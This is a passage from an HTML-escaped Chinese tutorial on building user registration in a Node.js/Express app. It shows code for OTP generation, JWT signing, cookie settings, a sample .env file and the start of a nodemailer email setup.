&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;const { email, password, passwordConfirm, username } = req.body;&lt;/code&gt;从传入请求中提取必要的注册详细信息：电子邮件、密码、密码确认和用户名在用户注册期间。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;const existingUser = await User.findOne({ email });&lt;/code&gt;检查数据库以查看具有给定电子邮件的用户是否已存在。如果是，它使用您的AppError实用程序发送错误响应。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;const otp = generateOtp();&lt;/code&gt;生成OTP，&lt;code&gt;const otpExpires = Date.now()…..&lt;/code&gt;用于设置OTP在指定时间或日期过期。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;const newUser = await User.create({…});&lt;/code&gt;，新用户及其凭据和OTP信息保存在MongoDB中，密码自动哈希。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;await sendEmail({…});&lt;/code&gt;向用户发送电子邮件。此电子邮件包含他们的登录OTP。如果电子邮件发送成功，&lt;code&gt;createSendToken(newUser, 200, res, &amp;quot;注册成功&amp;quot;);&lt;/code&gt;(这是一个实用函数)生成JWT令牌并在响应中发送它并带有成功消息。&lt;/p&gt;
&lt;p&gt;如果电子邮件发送失败或出现问题，&lt;code&gt;await User.findByIdAndDelete(newUser.id);&lt;/code&gt;从数据库中删除用户以保持清洁，并返回错误消息&amp;quot;There is an error sending the email. Try again&amp;quot;, 500。&lt;/p&gt;
&lt;h3 id=&#34;生成otp&#34;&gt;生成OTP
&lt;/h3&gt;&lt;p&gt;为确保用户的OTP成功发送给他们，在utils文件夹中，创建一个新文件并命名为generateOtp.js。然后添加代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的代码是一个函数，生成用户的随机4位OTP并将其作为字符串返回。&lt;/p&gt;
&lt;p&gt;完成上面的代码后，转到您的authController.js并确保在导入部分导入generateOtp.js。&lt;/p&gt;
&lt;h3 id=&#34;创建用户令牌&#34;&gt;创建用户令牌
&lt;/h3&gt;&lt;p&gt;接下来，将创建用户登录令牌，并在登录时分配给用户。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;signToken&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;userId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;jwt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sign&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;userId&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JWT_SECRET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;expiresIn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JWT_EXPIRES_IN&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;90d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//创建令牌的函数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;createSendToken&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;statusCode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;signToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;//生成cookie的函数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cookieOptions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;expires&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JWT_COOKIE_EXPIRES_IN&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;httponly&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;NODE_ENV&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;production&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//仅在生产环境中安全
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;sameSite&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;NODE_ENV&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;production&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;none&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Lax&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;token&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cookieOptions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwordConfirm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在上述代码正常工作之前，在您的.env文件中创建一个JWT。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-env&#34; data-lang=&#34;env&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//.env
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;JWT_SECRET&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; kaklsdolrnnhjfsnlsoijfbwhjsioennbandksd&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;JWT_EXPIRES_IN&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 90d
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;JWT_COOKIE_EXPIRES_IN&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;90&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的代码是.env文件应该看起来的样子。您的JWT_SECRET可以是任何内容，就像您在代码中看到的那样。&lt;/p&gt;
&lt;p&gt;注意：用户令牌创建逻辑应在登录逻辑之前运行。因此，在这种情况下，signToken和createSendToken逻辑应放在注册逻辑之前的顶部。&lt;/p&gt;
&lt;h3 id=&#34;发送电子邮件&#34;&gt;发送电子邮件
&lt;/h3&gt;&lt;p&gt;接下来，您需要配置电子邮件发送功能，以便在用户登录时自动将用户的OTP发送到他们的电子邮件。要配置电子邮件，转到utils文件夹，创建一个新文件，并为其命名。在此示例中，名称为email.js。&lt;/p&gt;
&lt;p&gt;在email.js中，我们将使用nodemailer包和Gmail作为提供商发送电子邮件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//email.js
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;nodemailer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nodemailer&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sendEmail&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;transporter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;nodemailer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createTransport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;service&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Gmail&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;auth&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HOST_EMAIL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;EMAIL_PASS&lt;/span&gt;
